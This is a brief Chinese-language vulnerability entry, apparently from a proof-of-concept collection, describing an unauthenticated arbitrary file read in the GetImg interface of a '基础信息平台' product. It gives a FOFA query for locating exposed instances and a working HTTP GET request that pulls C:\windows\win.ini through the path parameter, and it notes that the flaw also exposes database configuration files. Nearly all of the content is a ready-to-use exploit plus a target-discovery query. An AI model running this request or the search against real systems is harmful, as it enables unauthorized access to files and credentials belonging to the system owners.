# 地大信息-基础信息平台GetImg任意文件读取漏洞

地大信息-基础信息平台 GetImg 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取文件、数据库配置文件等等。

## fofa

```javascript
body="/SystemManage/BaseProject" || title=="基础信息平台"
```

## poc

```javascript
GET /SystemManage/BaseProject/GetImg?path=C:\windows\win.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close
```

![image-20240918135731789](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409181357847.png)